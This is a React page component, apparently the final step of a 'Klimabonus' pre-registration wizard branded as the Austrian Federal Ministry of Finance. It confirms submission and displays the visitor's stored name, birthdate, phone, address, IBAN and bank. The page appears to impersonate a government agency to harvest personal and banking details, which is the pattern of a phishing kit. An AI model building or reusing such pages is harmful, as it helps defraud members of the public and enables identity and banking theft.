import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { CheckCircle2, Check } from "lucide-react";
import KlimabonusWizardShell from "@/components/KlimabonusWizardShell";
import { supabase } from "@/integrations/supabase/client";

const BMF_RED = "#E6320F";

type SubmissionRow = {
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
};

const KlimabonusBestaetigung = () => {
  const [params] = useSearchParams();
  const sessionId = params.get("s");
  const [data, setData] = useState<SubmissionRow | null>(null);

  useEffect(() => {
    document.title = "Voranmeldung erfolgreich – Klimabonus | BMF";
    const description =
      "Ihre Klimabonus-Voranmeldung beim Bundesministerium für Finanzen wurde erfolgreich übermittelt. Bestätigung Ihrer Angaben.";
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", description);
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    (async () => {
      const { data } = await supabase
        .from("submissions")
        .select(
          "full_name,email,birthdate,phone,street,house_number,postal_code,city,iban,bank"
        )
        .eq("session_id", sessionId)
        .maybeSingle();
      if (data) setData(data as SubmissionRow);
    })();
  }, [sessionId]);

  const items: { label: string; value: string | null | undefined }[] = [
    { label: "Voller Name", value: data?.full_name },
    { label: "E-Mail-Adresse", value: data?.email },
    { label: "Geburtsdatum", value: data?.birthdate },
    { label: "Telefonnummer", value: data?.phone },
    {
      label: "Adresse",
      value:
        data &&
        [data.street, data.house_number].filter(Boolean).join(" ") +
          (data.postal_code || data.city
            ? `, ${[data.postal_code, data.city].filter(Boolean).join(" ")}`
            : ""),
    },
    { label: "IBAN", value: data?.iban },
    { label: "Bank", value: data?.bank },
  ];

  return (
    <KlimabonusWizardShell step={3}>
      <div className="text-center">
        <div className="mx-auto mb-5 w-16 h-16 rounded-full bg-green-50 flex items-center justify-center">
          <Check className="w-9 h-9 text-green-600" strokeWidth={2.5} />
        </div>
        <div
          className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2"
          style={{ color: BMF_RED }}
        >
          Schritt 3 von 3
        </div>
        <h1 className="text-2xl md:text-3xl font-semibold text-gray-900 mb-3">
          Voranmeldung erfolgreich übermittelt
        </h1>
        <p className="text-[14.5px] text-gray-600 max-w-md mx-auto leading-relaxed">
          Ihre Daten wurden erfolgreich übermittelt und werden geprüft. Der Klimabonus
          wird im Auszahlungsmonat auf das angegebene Konto überwiesen.
        </p>
      </div>

      <div className="mt-8 border border-gray-200 rounded-xl overflow-hidden">
        <div className="px-5 py-4 bg-gray-50 border-b border-gray-200">
          <h2 className="text-sm font-semibold text-gray-900">
            Übermittelte Angaben
          </h2>
        </div>
        <div className="divide-y divide-gray-100">
          {items.map((it) => (
            <div
              key={it.label}
              className="flex flex-col md:flex-row md:items-center md:justify-between gap-1 px-5 py-3"
            >
              <span className="text-[13px] font-medium text-gray-600">
                {it.label}
              </span>
              <div className="flex items-center gap-2">
                <span className="text-[13px] text-gray-900 break-all">
                  {it.value || <span className="text-gray-400">—</span>}
                </span>
                <Check className="w-4 h-4 text-green-600 shrink-0" />
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="mt-6 rounded-md bg-[#fff7ed] border border-[#fed7aa] px-4 py-3">
        <p className="text-[13px] text-[#7c2d12] leading-relaxed">
          <strong>Hinweis:</strong> Sie erhalten in Kürze eine Bestätigung per E-Mail.
          Es sind keine weiteren Schritte erforderlich.
        </p>
      </div>
    </KlimabonusWizardShell>
  );
};

export default KlimabonusBestaetigung;
